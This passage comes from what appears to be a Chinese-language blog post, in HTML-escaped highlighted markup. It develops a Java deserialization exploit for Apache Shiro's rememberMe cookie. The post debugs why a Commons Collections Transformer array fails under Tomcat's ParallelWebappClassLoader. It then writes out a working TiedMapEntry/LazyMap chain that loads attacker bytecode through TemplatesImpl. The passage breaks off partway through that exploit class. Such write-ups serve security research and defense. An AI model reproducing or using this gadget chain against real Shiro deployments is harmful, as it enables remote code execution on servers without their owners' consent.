&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将生成结果发送，但是console疯狂报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301212540550.png" alt="image-20220301212540550">&lt;/p>
&lt;p>看到这个&lt;code>org.apache.shiro.io.ClassResolvingObjectInputStream&lt;/code>，它重写了&lt;code>resolveClass&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ClassUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnknownClassException&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unable to load ObjectStreamClass [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">osc&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]: &amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是反序列化中用来查找类的方法，它重写了&lt;code>ObjectInputStream&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">latestUserDefinedLoader&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">primClasses&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到前者用的是&lt;code>org.apache.shiro.util.ClassUtils#forName&lt;/code>（内部是&lt;code>org.apache.catalina.loader.ParallelwebappClassLoader#loadClass&lt;/code>），而父类用的是&lt;code>Class.forName&lt;/code>&lt;/p>
&lt;p>我们在上面的位置打断点调试一下；注意如果断不下来，可以考虑往前找一找调用关系，比如org.apache.shiro.mgt.AbstractRememberMeManager#decrypt，它执行cookie部分的解码，中间触发反序列化&lt;/p>
&lt;p>&lt;code>resolveClass&lt;/code>依次得到我们链子中的LazyMap等等 都很正常，问题出在突然出现的&lt;code>[Lorg.apache.commons.collections.Transformer;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302012117925.png" alt="image-20220302012117925">&lt;/p>
&lt;p>&lt;code>clazz==null&lt;/code>，抛出异常，但并不是因它是&lt;code>[L&lt;/code>标记的数组这一点导致报错，因为在它后面还有&lt;code>fqcn=&amp;quot;[Ljava.lang.Object;&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302013221745.png" alt="image-20220302013221745">&lt;/p>
&lt;p>它就没有返回null，后面还有好几个都带&lt;code>[L&lt;/code>标记的对象，都没有返回null，这样的猜测显然是错误的&lt;/p>
&lt;p>重新发包并继续断在&lt;code>loadClass&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302014123306.png" alt="image-20220302014123306">&lt;/p>
&lt;p>我们注意到这里使用的&lt;code>ClassLoader&lt;/code>是上面的&lt;code>ParallelWebappClassLoader&lt;/code>，而它的工作模式就是这里的bug之处&lt;/p>
&lt;p>&lt;img src="https://images2015.cnblogs.com/blog/722072/201706/722072-20170623200651991-1212784795.png" alt="img">&lt;/p>
&lt;p>java装载类时遵循“全盘负责委托机制”，“全盘负责”指的是当一个ClassLoader装载一个类时，除非显示地使用另外一个ClassLoder，否则该类所依赖及引用的类也由这个ClassLoder载入；“委托机制”指先委托父类装载器寻找目标类，只有在找不到的情况下才从自己的类路径中查找并装载目标类，对应到这里，当它找不到时就会用上面的&lt;code>URLClassLoader&lt;/code>&lt;/p>
&lt;p>（特别注意的是，&lt;code>WeappClassLoader&lt;/code>默认不适用委托机制&lt;/p>
&lt;p>正常的class解析后path是最前面加&lt;code>/&lt;/code>，&lt;code>.&lt;/code>换为&lt;code>/&lt;/code>，&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302015732344.png" alt="image-20220302015732344">&lt;/p>
&lt;p>之后这个值会传入hashMap作为key，我们直接在key的地方断，发现Transformer数组传入稍有点特殊（数组都这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020435664.png" alt="image-20220302020435664">&lt;/p>
&lt;p>问题是它在前一步调用的是上层的&lt;code>URLClassLoader&lt;/code>！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020339145.png" alt="image-20220302020339145">&lt;/p>
&lt;p>对照其它带&lt;code>[L&lt;/code>的对象&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020711367.png" alt="image-20220302020711367">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020959932.png" alt="image-20220302020959932">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302021055809.png" alt="image-20220302021055809">&lt;/p>
&lt;p>被正常解析&lt;/p>
&lt;p>经过上面的调试我们可以得出结论：当反序列化流中出现非java自身的数组，会引起&lt;code>ParallelWebappClassLoader&lt;/code>触发双亲委托机制，将对象交给上层的&lt;code>URLClassLoader&lt;/code>进行处理，由于参数的不匹配，自然就出现无法加载类的错误&lt;/p>
&lt;h3 id="搞个行的">搞个行的&lt;/h3>
&lt;p>既然问题出在非java原生的Transformer数组上，我们把它换为&lt;code>TiedMapEntry&lt;/code>，构造函数接收两个参数 Map和Key，它有一个&lt;code>getValue&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当我们出传入的map是LazyMap时，这个get就可以触发transform的回调了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前面用到&lt;code>get&lt;/code>时我们并不关心传入的key，因为重点在Transformer数组的ConstantTransformer，我们通过它来初始化恶意对象&lt;/p>
&lt;p>而仔细看这里的key会被传入&lt;code>transform&lt;/code>，它可以扮演ConstantTransformer的角色&lt;/p>
&lt;p>再回看Transformer数组&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二行可以去掉，数组长度变为1，数组也不需要了&lt;/p>
&lt;p>编写一下exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
